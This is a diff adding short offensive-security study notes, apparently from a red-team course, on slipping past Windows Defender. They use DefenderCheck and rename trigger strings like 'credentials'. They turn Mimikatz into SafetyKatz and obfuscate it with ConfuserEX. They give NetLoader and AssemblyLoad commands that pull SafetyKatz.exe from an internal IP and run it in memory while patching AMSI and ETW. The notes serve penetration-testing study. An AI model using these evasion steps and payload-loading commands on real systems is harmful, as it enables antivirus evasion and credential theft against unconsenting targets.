@@ -1,0 +1,41 @@
+
+
+
+<a href="https://github.com/matterpreter/DefenderCheck">DEFENDER CHECK</a> can be used to detect code and 
+strings from a binary that windows defender may flag as malicious.
+
+usage:
+
+PS> DefenderCheck.exe [file]
+
+>>> STRING MANIPULATION
+
+the sample way is to edit the code using an IDE, sample, visual studio.
+for example, some triggers are associated to the words "credentials", so the basic way to bypass this 
+is replacing the trigger word with another word, sample: "Credents". (remember to replace in all code")
+run DefenderCheck until there's no flags. 
+
+<b>::: STRING MANIPULATION for SAFETYKATZ</b> Page 114
+
+1. get latest version of mimikatz & Out-CompressedDll.ps1
+2. run the Out-CompressedDll.ps1 powerShell script on Mimikatz binary and save the output to a file.
+
+PS> Out-CompressedDll [Path/to/mimikatz.exe] > outputfilename.txt 
+
+<b>::: BETTERSAFETYKATZ</b> Page 117
+
+<b>::: AV-BYPASS OBFUSCATION (ConfuserEX)</b> Page 119
+
+<b>::: PAYLOAD DELIVERY</b>
+
+The tool "netloader" can be used to deliver the payload
+
+<a href="https://github.com/Flangvik/NetLoader">NETLOADER</a>
+
+<b>::: LOAD BINARY FORM FILEPATH OR URL AND PATCH AMSI & ETW WHILE EXECUTING</b>
+
+PS> C:\Users\Public\Loader.exe -path http://192.168.100.X/SafetyKatz.exe
+
+<b>::: USE ASSEMBLYLOAD.EXE THAT CAN BE USED TO LOAD NETLOADER IN MEMORY FROM URL WHICH THEN LOADS A BINARY FROM FILEPATH OR URL</b>
+
+PS> C:\Users\Public\AssemblyLoad.exe http://192.168.100.X/Loader.exe -path http://192.168.100.X/SafetyKatz.exe 
